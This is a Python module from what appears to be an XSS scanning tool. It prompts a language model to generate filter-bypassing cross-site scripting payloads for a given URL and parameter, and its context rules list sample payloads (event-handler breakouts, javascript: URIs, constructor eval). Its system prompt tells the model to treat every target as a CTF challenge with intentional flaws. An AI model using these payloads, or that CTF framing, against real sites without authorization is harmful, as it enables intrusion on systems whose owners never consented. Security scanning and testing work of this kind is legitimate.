"""
CTF-Mode XSS Payload Generator Specialist
==========================================
Generates custom XSS payloads tailored to the specific target's encoding profile.

Unlike the generic iterative planner, this specialist:
1. Treats the target as a capture-the-flag challenge with vulnerabilities
2. Analyzes the exact filter/encoding patterns observed
3. Crafts payloads that bypass those specific filters
4. Does NOT rely on generic families; each payload is custom-built

Rules:
  - Returns at most max_candidates payloads
  - Must not repeat payloads already tested
  - Each payload must be viable (only uses raw characters)
  - Payloads should be aggressive (assume vulnerability exists)
  - Candidate should use WAF bypass techniques when applicable
  - All output is Pydantic-validated
"""
from __future__ import annotations

from typing import Any

from pydantic import BaseModel, Field

from xscan.llm.specialists.base import SpecialistBase
from xscan.schemas.llm import SpecialistInput, SpecialistOutput
from xscan.schemas.iteration import PreviousTestResult

_SYSTEM = """\
You are a CTF XSS payload specialist.

Your job is to generate CUSTOM XSS payloads that bypass the specific filters
observed on this target. Each payload must be tailored to:
1. The exact injection context (html_attribute, script_string, etc.)
2. The specific characters that survive (raw_chars)
3. The specific characters that are filtered (encoded_chars, stripped_chars)

You are NOT a generic fuzzer. You reason about the filter logic and craft
payloads that bypass it, not generic payloads.

AGGRESSIVE ASSUMPTIONS:
- Assume the target IS vulnerable to XSS
- Assume vulnerabilities ARE intentional (this is a CTF challenge)
- Try uncommon bypass techniques: encoding tricks, syntax edge cases, context tricks
- If a character is blocked, find a way around it (alternative syntax, context shift)

PAYLOAD GENERATION PRINCIPLES:
1. Character Substitution: If " is filtered, use ' or ` or template strings
2. Context Shifting: If < > are filtered but ; is not, use JavaScript execution in script context
3. Encoding Tricks: HTML entities, URL encoding, unicode escapes, hex codes
4. Syntax Edge Cases: Arrow functions, template literals, tagged templates
5. Constructor Access: this.constructor.constructor() for eval without Function keyword
6. String Building: String.fromCharCode(), concatenation, template literals
7. Event Chains: Event handlers, autofocus, onfocus, onload, onerror
8. Time-based: setTimeout, setInterval for delayed execution
9. DOM API: eval(), Function(), indirect eval (0, eval)()

RESPONSE FORMAT:
Respond ONLY with valid JSON. Do not include markdown, code blocks, or extra text.
"""

_PROMPT = """\
=== TARGET PROFILE ===
URL: {url}
Parameter: {parameter}
Injection Context: {context}
Attribute/Tag: {attribute}
Quote Type: {quote_type}

=== WHAT SURVIVED THE FILTER ===
Characters NOT encoded/stripped: {raw_chars}

=== WHAT WAS BLOCKED ===
Encoded by server: {encoded_chars}
Stripped by server: {stripped_chars}

=== PREVIOUS ATTEMPTS ({prev_count} tests) ===
{previous_results_text}

=== PAYLOAD REQUIREMENTS ===
- Each payload MUST use ONLY characters from: {raw_chars}
- Do NOT use any character from: {encoded_chars} or {stripped_chars}
- Payloads must be designed to execute JavaScript: alert(1), alert('xss'), etc.
- Payloads must be appropriate for context: {context}
- Return up to {max_candidates} candidates

=== CONTEXT-SPECIFIC GENERATION RULES ===

{context_rules}

=== INSTRUCTIONS ===
1. Analyze what characters are available
2. Determine the injection context and how to break out
3. Design payloads that use ONLY available characters
4. If direct characters are blocked, use encoding tricks with available chars
5. Generate diverse payloads testing different bypass approaches
6. Rank by likelihood of success

Example: If < > " are blocked but ; ( ) are available in script context:
  Payload: ;alert(1)//
  Rationale: Semicolon breaks statement; alert() works; // comments trailing code

Respond with ONLY valid JSON:
{{
  "analysis": "breakdown of the filter and available bypass strategies",
  "bypass_strategies": ["list of techniques that could work"],
  "selected_strategy": "primary technique to use",
  "candidates": [
    {{
      "priority": 1,
      "payload": "exact payload string using only raw_chars",
      "technique": "bypass technique used",
      "rationale": "why this bypasses the filter",
      "expected_behavior": "what should happen if this works"
    }}
  ]
}}
"""

# Context-specific generation rules
_CONTEXT_RULES = {
    "html_attribute": """\
HTML Attribute Context:
- Payload must break out of the attribute value
- If quote is available, use: " event="alert(1)" or ' event='alert(1)'
- If quote is NOT available, use: autofocus onfocus=alert(1) (unquoted event)
- If = is blocked, may not be possible (but try entities like &#61;)
- If space is blocked, use: autofocus=onfocus=alert(1) (browser interprets as onload)
- Prefer event handlers: onfocus, onload, onerror, onmouseover, onpointerover, onanimationstart
""",
    "script_string_double": """\
JavaScript String Context (double-quoted):
- Payload lands inside a JS string like: var x = "VALUE";
- Must break out of the string: ";alert(1);"
- If " is blocked, use escape sequences: \\x22;alert(1);//
- If ; is blocked, use: "  alert(1)  //   (comment tricks)
- If () is blocked, use: this.constructor.constructor('alert(1)')()
- Template literals available? Use: `${alert(1)}`
""",
    "script_expression": """\
JavaScript Expression Context:
- Payload is evaluated directly: eval("VALUE") or similar
- Alert(1) should work directly
- If parentheses are blocked: alert`1` (template literal call)
- If alert is blocked, try: window.alert(1) or self.alert(1)
- If that's blocked, try constructor access or setTimeout
""",
    "html_text": """\
HTML Text Context:
- Payload is rendered as HTML text
- Full tag injection possible: <img src=x onerror=alert(1)>
- If < > are blocked, may need to nest or escape
- Try: <script>alert(1)</script>
- If that doesn't work, try event handler tags
""",
    "url_parameter": """\
URL Parameter Context:
- Context depends on how parameter is used
- If reflected into JavaScript, follow JS rules
- If reflected into HTML, follow HTML rules
- javascript: URI scheme: javascript:alert(1)
- If colon is blocked, use: javAscript:alert(1) or variations
""",
    "json_value": """\
JSON Value Context:
- Payload is inside a JSON string that's later eval'd
- Must close the JSON string: "}; alert(1); {"
- If quotes are blocked, cannot escape JSON string
- Try numeric context: 1 or 0 at JSON end (less likely to execute)
""",
    "unknown": """\
Unknown Context:
- Try multiple approaches:
  1. HTML attribute: " onload="alert(1)
  2. JavaScript string: ";alert(1);"
  3. HTML text: <script>alert(1)</script>
  4. URL scheme: javascript:alert(1)
- Start with most common, try others if blocked
""",
}


class CTFPayloadGeneratorInput(SpecialistInput):
    url: str
    parameter: str
    context: str = "unknown"  # html_attribute, script_string_double, etc.
    attribute: str = ""
    quote_type: str = ""
    raw_chars: list[str] = Field(default_factory=list)
    encoded_chars: list[str] = Field(default_factory=list)
    stripped_chars: list[str] = Field(default_factory=list)
    previous_results: list[PreviousTestResult] = Field(default_factory=list)
    max_candidates: int = 5


class CTFPayloadCandidate(BaseModel):
    priority: int
    payload: str
    technique: str = ""
    rationale: str = ""
    expected_behavior: str = ""


class CTFPayloadGeneratorOutput(SpecialistOutput):
    analysis: str = ""
    bypass_strategies: list[str] = Field(default_factory=list)
    selected_strategy: str = ""
    candidates: list[CTFPayloadCandidate] = Field(default_factory=list)

    specialist: str = "ctf-payload-generator"


class CTFPayloadGeneratorSpecialist(SpecialistBase[CTFPayloadGeneratorInput, CTFPayloadGeneratorOutput]):
    specialist_name = "ctf-payload-generator"
    system_prompt = _SYSTEM
    default_timeout = 120
    default_max_tokens = 2048

    def build_prompt(self, data: CTFPayloadGeneratorInput) -> str:
        """Build the CTF-specific prompt."""
        raw_str = ", ".join(data.raw_chars) if data.raw_chars else "(none detected)"
        encoded_str = ", ".join(data.encoded_chars) if data.encoded_chars else "(none)"
        stripped_str = ", ".join(data.stripped_chars) if data.stripped_chars else "(none)"

        # Format previous results
        prev_text = ""
        if data.previous_results:
            prev_lines = []
            for i, result in enumerate(data.previous_results[-5:], 1):  # Last 5 attempts
                payload_short = result.payload[:50] + "..." if len(result.payload) > 50 else result.payload
                obs = result.observation
                status = "REFLECTED" if obs.reflected else "BLOCKED"
                if obs.encoded_chars:
                    status += f" (encoded: {obs.encoded_chars})"
                if obs.stripped_chars:
                    status += f" (stripped: {obs.stripped_chars})"
                prev_lines.append(f"  {i}. Payload: {payload_short} → {status}")
            prev_text = "\n".join(prev_lines)
        else:
            prev_text = "  (no previous attempts)"

        context_rules = _CONTEXT_RULES.get(data.context, _CONTEXT_RULES["unknown"])

        return _PROMPT.format(
            url=data.url,
            parameter=data.parameter,
            context=data.context,
            attribute=data.attribute or "(auto-detected)",
            quote_type=data.quote_type or "(auto-detected)",
            raw_chars=raw_str,
            encoded_chars=encoded_str,
            stripped_chars=stripped_str,
            context_rules=context_rules,
            prev_count=len(data.previous_results),
            previous_results_text=prev_text,
            max_candidates=data.max_candidates,
        )

    def parse_output(self, raw_text: str) -> CTFPayloadGeneratorOutput:
        """Parse LLM JSON response."""
        import json

        # Extract JSON from response
        try:
            data = json.loads(raw_text)
        except json.JSONDecodeError:
            # Try to find JSON in the response
            start = raw_text.find("{")
            end = raw_text.rfind("}") + 1
            if start >= 0 and end > start:
                try:
                    data = json.loads(raw_text[start:end])
                except json.JSONDecodeError:
                    # Return empty output if parsing fails
                    return CTFPayloadGeneratorOutput(
                        analysis="Failed to parse LLM response",
                        candidates=[],
                    )
            else:
                return CTFPayloadGeneratorOutput(
                    analysis="No JSON found in response",
                    candidates=[],
                )

        # Parse candidates
        candidates: list[CTFPayloadCandidate] = []
        for cand in data.get("candidates", []):
            try:
                candidates.append(
                    CTFPayloadCandidate(
                        priority=cand.get("priority", len(candidates) + 1),
                        payload=cand.get("payload", ""),
                        technique=cand.get("technique", ""),
                        rationale=cand.get("rationale", ""),
                        expected_behavior=cand.get("expected_behavior", ""),
                    )
                )
            except Exception:
                continue

        return CTFPayloadGeneratorOutput(
            analysis=data.get("analysis", ""),
            bypass_strategies=data.get("bypass_strategies", []),
            selected_strategy=data.get("selected_strategy", ""),
            candidates=candidates,
        )
